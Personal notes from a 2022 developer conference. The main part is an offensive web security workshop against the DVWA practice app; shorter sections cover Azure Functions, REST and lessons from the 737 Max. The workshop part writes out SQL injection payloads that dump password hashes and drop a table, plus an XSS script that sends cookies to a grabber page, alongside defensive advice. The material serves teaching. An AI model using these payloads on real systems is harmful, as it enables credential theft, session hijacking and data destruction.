# DevUp 2022

## Offensive Web Security Workshop

Files: bit.ly/3xi2hxs
Slides: https://t.co/0ypb9QvAZy

Github Links from the workshop
https://github.com/swisskyrepo/PayloadsAllTheThings/
https://github.com/alexedwards/argon2id
https://github.com/beefproject/beef
https://github.com/zaproxy/zaproxy
https://github.com/berzerk0/Probable-Wordlists
https://github.com/sqlmapproject/sqlmap
https://github.com/paragonie/awesome-appsec
https://github.com/exploitprotocol/app-sec-wiki
https://github.com/digininja/DVWA



### Overview
Web Application Firewall (logs) will show many common attempted attacks

    - Path traversal
    - Command injection
    - File Upload
    - File Inclusion
    -


### SQL injections

https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection

Start with a ' to juke the existing query syntax
End with a comment (`-- ` or `#`) to skip the end of the exsiting query (to resolve syntax errors after injection)

- List all Users. The or 1=1 makes the exsting query "always true"
    
    `' or 1=1 # `

Use `union select` to pivot into other queries

Result of your query must have the same number of columns as the exsitng query. You can find that out with something like
- Find out the number of columns in the current table/result (n + 1, so if the table has 2 colummns, the error will say `Unknown column '3' in 'order clause'`)

    `' ORDER BY 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65,66,67,`68,69,70,71,72,73,74,75,76,77,78,79,80,81,82,83,84,85,86,87,88,89,90,91,92,93,94,95,96,97,98,99,100 #


Use functions:
- Show version

    `' or 1=1 union select null, version() #`

- Show current time lol

    `0' or 1=1 union select null, now() #`

- Show current database

    `' or 1=1 union select null, database() #`

- Show user database is running as

    `' or 1=1 union select null, user() #`

Use other queries. 

- List database tables

    `' and 1=1 union select null, table_name from information_schema.tables # `

- List column names of a table

    `' union select null, column_name from information_schema.columns where table_name = 'users' #`

    `' union select null, column_name from information_schema.columns where table_name = 'guestbook' #`

- Read comments from guestbook

    `' union select name, comment from guestbook #`

- Read passwords from users

    `' union select user_id, password from users #`

- Delete a table    

    '; drop table guestbook #

### Cross site scripting

https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XSS%20Injection

Effective way of stealing cookies (Access user's cookie store and send somewhere)
<script>document.location='http://localhost/XSS/grabber.php?c='+document.cookie</script>

BEEF is a tool which can be used to build xss scripts

excess-xss.com

### Cross Site Request Forgery

Abusing cookies for impersonation and priveledge escalation

With REST GET requests, site cookies are sent along with the request


### Direct Object Access

Look for IDs in URLs, etc

Mitigate with RBAC on resources.


### Session Management

jwt.io - Web UI for decoding Javascript Web Tokens

JWT's consist of 3 b64 blobs separated by '.' The first blob is a header, describing the type of token and hash algorithm to use for verification. Second is the paylod data (json). Third is a verification blob formatted as 

    HMACSHA256(
        base64UrlEncode(header) + "." +
        base64UrlEncode(payload), +
        your salt
    )
  
JWTs are commonly used as "Session Tokens", which describe the session (lol) - ie, user, browser data, time, expiry time, etc.

"authentication tokens" which describe the user, their permissions, issue and expiry time

Always manage these infos as separate tokens. Don't combine Session and Authentication Tokens

SAML is an XML based standard for web browser single sign-on.



### Misc

Mitre tweets out every new CVE as they are published

https://www.exploit-db.com/ - Registry of known exploits
jwt.io - Web UI for decoding Javascript Web Tokens


Web Application Firewalls's
    - Good at detecting injection and XSS accacks
    - Won't help with Direct Object Access and most CSRF attacks
    - Deploy them in Dev & Staging Environments as well as Prod
    - Don't start in Prod or you will likely encounter unintended behavior
    - Can start with 'audit' vs 'block' mode to validate expected behavior

During upgrades, wipe everything (configs, static files) and start fresh :)

Don't hardcode secrets, use a vault, and rotate them

be wary of secret management in k8s

Design apps with security in mind. "Bolting On" security after the fact is error prone
Do threat modeling early, and revisit this exercise regularly. (Actors & Motivations)
Document the locations of all sensitive infomation in your application

Produce audit logs 

Audit your dependencies (Vet them, Updates, etc). Regular minor version updates are much easier to deal with than infrequent large updates. Can do this during CICD
Run some static analysis during CICD as well

http://www.wechall.net/  - Registry of hack-the-box style sites and CTFs

## REST Microservices with Azure Functions

### Representational State Transfer:
REST services are Stateless, Cache-able Layered, with a Consistent Interface

GET POST(create) PUT(update/overwrite) PATCH(partial update) DELETE

Status codes: https://developer.mozilla.org/en-US/docs/Web/HTTP/Status

### Serverless
Azure Function 
- Docs: https://docs.microsoft.com/en-us/azure/azure-functions/
- Durable (Stateful) Function extension: https://docs.microsoft.com/en-us/azure/azure-functions/durable/durable-functions-overview
- Github: https://github.com/Azure/Azure-Functions

Serverless: Don't worry about config, scaling, and generally just think about the server, less 😜

Languages supported out of the box: c# js, pwsh, java, python, custom handlers for others
- Custom Handler docs for go https://docs.microsoft.com/en-us/azure/azure-functions/create-first-function-vs-code-other?tabs=go%2Cmacos

Cheap$ - Pay per use, not time. Premium plan allows for services to always be warm (And allows private IPs)
- Use includes # of requests, and also the amount of Memory used by your service while it's running

Integrates easily with other azure offerings. Event hub, storage accounts, etc - These services can also trigger functions

A 'Function App' is a project which can contain multiple 'Functions'. Triggering one Function will 'warm' all functions in the App.
Organize function apps for performance & scaleability. Don't want to spin up unrelated functions if you can avoid it

Q: Is 'CareType' an App, with a function for each HTTP method? Or were multiple APIs hosted by a more encompassing app


#### Gotchas:
Testing challenges:
    - Need to test interactions between services
    - Can bundle things and mock e2e tests

Security concerns: Shared infra by nature. Public IPs only unless on premium

Azure Functions have a capped runtime - 5min by default, but can push to 10 in settings. Other infra / paas offerings allow for long runtimes

You'll also suffer from a cold start, but on the other hand you don't pay for downtime. You can rig a service to ping your function every so often to keep it warm.

Vendor Lock in? Hard to migrate entire set-ups between providers

Avoid cross-function communication

Avoid sharing storage accounts (code for functions live in a SA. Separate Apps should use separate SA's)

Avoid blocking calls & use Async 

## Lessons learned from the 737 Max

At takeoff: Redundent instruments read different measurements: Speed and AOA. Within 1min of takeoff the speed and altitude measurements were noticeably off 

Double and triple check assumptions. Hire SMEs. Get as close to the problem as possibl 

Fail safe instead of Fail-proof

Option to Opt out of automtaion in critical scenarios. Balance Reality and "Making life easier"

Use cases, Abuse cases, Safety cases. Don't assume safety - make it a requirement. Be wary when requirements are not technical (political)

"Writing Secure Code" book

No training = No awareness. MCAS system was kept behind a curtain

Cheap is Expensive. Countries trusted FAA. FAA trusted Boeing. Boeing outsourced

## Event driven Microservices
